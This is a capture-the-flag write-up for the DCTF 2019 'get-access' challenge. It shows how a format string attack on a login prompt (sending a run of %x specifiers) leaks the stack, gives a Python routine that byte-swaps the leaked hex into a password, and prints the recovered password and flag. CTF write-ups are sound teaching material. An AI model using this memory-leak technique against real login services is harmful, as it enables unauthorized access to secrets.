# get-access:
## Challenge Description:
* There is no binary for this challenge.
* The task is to find the flag/password by connecting to the challenge server via netcat.
* Once we are connected, the server prompts us for a username and password.

## Vulnerabilities:
* The username input is vulnerable to a format string attack.
* I spammed the username field with 100 %x's to print a hexdump of the stack with the help of the pwntools and our python script.
* This is what is returned to:
```c
[+] Opening connection to 206.81.24.129 on port 1337: Done
[+] Response: You must login first before get the flag
Enter username:
[+] Response: Enter password:ff82b5662a9f4400802578b60425782578257825782578257825782578257825782578257825782578257825782578257825782578780000000000000[5f240000533148544854533133573433334d305353733450445230775952304643445530303246545f3931]782578257825782578257825782578257825782578257825782578257825782578257825 does not have access!
```
* The interesting part is marked between the square brackets. This is basically a hex encoded string so I developed some python code to decode this, taking into account the byte ordering. The code is shown below:
```py
    def extract_flag(extracted_hex):
        message = list(extracted_hex.decode('hex'))
        flag = []

        n = len(message)
        for i in range(0, n, 4):
            if i + 3 < n:
                flag.append(message[i + 3])

            if i + 2 < n:
                flag.append(message[i + 2])

            if i + 1 < n:
                flag.append(message[i + 1])

            flag.append(message[i])

        print "[+] Raw password: " + extracted_hex
        print "[+] Decoded password: " + ''.join(flag) + " (Ignore QQ)"
        return 0 

    extract_flag("5f245151533148544854533133573433334d305353733450445230775952304643445530303246545f3931")
```
* Only two bytes of the first 4 bytes are actually used i.e 5f24 are used but 5151 are just padding bytes.
* The extracted password is: $_TH1S1STH34W3S0M3P4sSw0RDF0RY0UDCTF2019_

## Getting the flag:
* Sending any username (I chose to send DCTF2019) and the extracted password returns the flag.

## Flag:
DCTF{BD8C664E74EB942225EFB74CFD76EC4B2FDA0C37A2D567B707AA1407781FF77F}

## Scripts used:
```
    See exploit.py
```